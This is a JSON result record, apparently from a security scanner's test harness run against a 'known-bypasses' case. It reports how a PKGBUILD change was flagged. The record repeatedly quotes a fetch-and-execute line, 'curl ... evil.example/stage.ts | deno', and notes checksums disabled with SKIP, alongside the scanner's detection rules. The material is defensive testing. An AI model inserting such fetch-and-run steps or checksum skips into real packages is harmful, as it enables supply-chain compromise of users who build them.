@@ -1,0 +1,267 @@
+{
+  "attempt": 2,
+  "cost": {},
+  "db_hash": "sha256:e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855",
+  "diff_sha256": "sha256:7b324c1cc36efe6ff9334c1f1c43c028ca3aa9ca3d6cd2ac2bbdb77effecb572",
+  "generator": {
+    "directory": "/home/eclipse/Documents/GitHub/trustsight-harness/campaigns/known-bypasses-manual/manual",
+    "inputs": 4,
+    "type": "manual"
+  },
+  "judge": {
+    "catching_rules": [],
+    "coverage_gaps": [
+      "tree_not_analyzed"
+    ],
+    "fatal": false,
+    "rationale": "coverage gaps forbid UNFLAGGED: tree_not_analyzed",
+    "verdict": "fail_closed_catch"
+  },
+  "stages": {
+    "_text_source": "generator",
+    "behavior": {
+      "chain": "curl -> | deno",
+      "preserved": true,
+      "reason": "",
+      "validator_version": "sha256:d281050b4092e61a1145639f7eec8ad7fdf27aa698ad0a0b249d9ac3e0742236"
+    },
+    "constraints": {
+      "honored": true,
+      "violated": []
+    },
+    "sanitization": {
+      "passed": true,
+      "reason": ""
+    },
+    "syntax": {
+      "bash_n_new": 0,
+      "bash_n_old": 0,
+      "reason": ""
+    }
+  },
+  "status": "fail_closed_catch",
+  "trustsight": {
+    "config_fingerprint": "sha256:674ed4b8bef677140dfac9d70671a3dea5221fb93c0d3f35cf17036c55baccb1",
+    "report": {
+      "changes": [
+        "checksums changed from sha256 to SKIP",
+        "source host added: evil.example"
+      ],
+      "config_fingerprint": "sha256:674ed4b8bef677140dfac9d70671a3dea5221fb93c0d3f35cf17036c55baccb1",
+      "coverage_gaps": [
+        "tree_not_analyzed"
+      ],
+      "dependencies": [],
+      "depth_truncated": false,
+      "diff_truncated": false,
+      "failed": false,
+      "file_changes": [],
+      "findings": [
+        {
+          "description": "Uses curl in PKGBUILD: +  curl -fsSL https://evil.example/stage.ts | deno [R010]",
+          "evidence": {
+            "match": "+  curl -fsSL https://evil.example/stage.ts | deno"
+          },
+          "file": "PKGBUILD",
+          "line": 11,
+          "rule_id": "R010",
+          "severity": "LOW",
+          "template": "Uses curl in PKGBUILD: {match}"
+        },
+        {
+          "description": "checksum set to SKIP [R004]",
+          "evidence": {
+            "match": "sha256sums=SKIP",
+            "skip_suffix": ""
+          },
+          "file": "PKGBUILD",
+          "line": 14,
+          "rule_id": "R004",
+          "severity": "HIGH",
+          "template": "checksum set to SKIP{skip_suffix}"
+        },
+        {
+          "description": "Fetch Piped Into An Unrecognised Consumer: fetch piped into deno: curl -fsSL https://evil.example/stage.ts | deno [X016]",
+          "evidence": {
+            "body": "curl -fsSL https://evil.example/stage.ts | deno",
+            "match": "fetch piped into deno: curl -fsSL https://evil.example/stage.ts | deno",
+            "shape": "fetch piped into deno"
+          },
+          "file": "PKGBUILD",
+          "line": 19,
+          "rule_id": "X016",
+          "severity": "HIGH",
+          "template": "Fetch Piped Into An Unrecognised Consumer: {match}"
+        },
+        {
+          "description": "build() fetches https://evil.example/stage.ts from outside the declared source array [R061]",
+          "evidence": {
+            "match": "build() downloads https://evil.example/stage.ts, which is not in source=()",
+            "position": "build",
+            "url": "https://evil.example/stage.ts"
+          },
+          "file": "PKGBUILD",
+          "line": null,
+          "rule_id": "R061",
+          "severity": "HIGH",
+          "template": "{position}() fetches {url} from outside the declared source array"
+        },
+        {
+          "description": "Source URL classified as unknown (https://evil.example/stage.ts) [SOURCE_BUCKET]",
+          "evidence": {},
+          "file": "",
+          "line": null,
+          "rule_id": "SOURCE_BUCKET",
+          "severity": "MEDIUM",
+          "template": ""
+        }
+      ],
+      "first_seen": false,
+      "flagged": true,
+      "fully_vetted": false,
+      "ioc_matches": [],
+      "is_trivial": true,
+      "new_commit": "",
+      "new_version": "1.0.0",
+      "old_commit": "",
+      "old_version": "1.0.0",
+      "package": "harness-pkg",
+      "required_by": [],
+      "review_profile": "default",
+      "review_threshold": 20,
+      "risk": "Critical",
+      "risk_label": "Critical (incomplete analysis)",
+      "scan_truncated": false,
+      "score": 100,
+      "score_breakdown": [
+        {
+          "evidence": {
+            "match": "+  curl -fsSL https://evil.example/stage.ts | deno"
+          },
+          "file": "PKGBUILD",
+          "line": 11,
+          "params": {},
+          "reason": "Uses curl in PKGBUILD: +  curl -fsSL https://evil.example/stage.ts | deno",
+          "rule_id": "R010",
+          "severity": "LOW",
+          "template": "Uses curl in PKGBUILD: {match}",
+          "weight": 5
+        },
+        {
+          "evidence": {
+            "match": "sha256sums=SKIP",
+            "skip_suffix": ""
+          },
+          "file": "PKGBUILD",
+          "line": 14,
+          "params": {
+            "skip_suffix": ""
+          },
+          "reason": "Checksum Disabled: sha256sums=SKIP",
+          "rule_id": "R004",
+          "severity": "HIGH",
+          "template": "checksum set to SKIP{skip_suffix}",
+          "weight": 25
+        },
+        {
+          "evidence": {
+            "body": "curl -fsSL https://evil.example/stage.ts | deno",
+            "match": "fetch piped into deno: curl -fsSL https://evil.example/stage.ts | deno",
+            "shape": "fetch piped into deno"
+          },
+          "file": "PKGBUILD",
+          "line": 19,
+          "params": {
+            "body": "curl -fsSL https://evil.example/stage.ts | deno",
+            "shape": "fetch piped into deno"
+          },
+          "reason": "Fetch Piped Into An Unrecognised Consumer: fetch piped into deno: curl -fsSL https://evil.example/stage.ts | deno",
+          "rule_id": "X016",
+          "severity": "HIGH",
+          "template": "Fetch Piped Into An Unrecognised Consumer: {match}",
+          "weight": 25
+        },
+        {
+          "evidence": {
+            "match": "diff modifies build()",
+            "touched": "build"
+          },
+          "file": "PKGBUILD",
+          "line": null,
+          "params": {
+            "touched": "build"
+          },
+          "reason": "Critical Build Function Modified: diff modifies build()",
+          "rule_id": "R060",
+          "severity": "INFO",
+          "template": "critical build function modified: {touched}",
+          "weight": 0
+        },
+        {
+          "evidence": {
+            "match": "build() downloads https://evil.example/stage.ts, which is not in source=()",
+            "position": "build",
+            "url": "https://evil.example/stage.ts"
+          },
+          "file": "PKGBUILD",
+          "line": null,
+          "params": {
+            "position": "build",
+            "url": "https://evil.example/stage.ts"
+          },
+          "reason": "Hidden Network Fetch In Build: build() downloads https://evil.example/stage.ts, which is not in source=()",
+          "rule_id": "R061",
+          "severity": "HIGH",
+          "template": "{position}() fetches {url} from outside the declared source array",
+          "weight": 25
+        },
+        {
+          "evidence": {
+            "match": "rule hits span 5 distinct capability categories",
+            "n_categories": 5
+          },
+          "file": "",
+          "line": null,
+          "params": {
+            "n_categories": 5
+          },
+          "reason": "Capability Density Anomaly: rule hits span 5 distinct capability categories",
+          "rule_id": "R072",
+          "severity": "INFO",
+          "template": "findings span {n_categories} distinct capability categories",
+          "weight": 0
+        },
+        {
+          "evidence": {
+            "gap": "tree_not_analyzed"
+          },
+          "file": "",
+          "line": null,
+          "params": {
+            "gap": "tree_not_analyzed"
+          },
+          "reason": "Coverage gap: the repository file manifest was unavailable, so only the PKGBUILD was examined",
+          "rule_id": "COVERAGE",
+          "severity": "INFO",
+          "template": "",
+          "weight": 0
+        },
+        {
+          "evidence": {},
+          "file": "",
+          "line": null,
+          "params": {},
+          "reason": "Source URL classified as unknown (https://evil.example/stage.ts)",
+          "rule_id": "SOURCE_BUCKET",
+          "severity": "MEDIUM",
+          "template": "",
+          "weight": 20
+        }
+      ],
+      "suppressed_rules": [],
+      "verdict": "This analysis was incomplete: the repository file manifest was unavailable, so only the PKGBUILD was examined. The result describes what was examined, not the whole change. Version bump. added 1 source URL(s). Signals: checksum set to SKIP [R004]; Fetch Piped Into An Unrecognised Consumer: fetch piped into deno: curl -fsSL https://evil.example/stage.ts | deno [X016]; build() fetches https://evil.example/stage.ts from outside the declared source array [R061]; Source URL classified as unknown (https://evil.example/stage.ts) [SOURCE_BUCKET]; Uses curl in PKGBUILD: +  curl -fsSL https://evil.example/stage.ts | deno [R010]. Review the diff before building.",
+      "version_comparison": ""
+    },
+    "wall_clock_ms": 764
+  }
+}
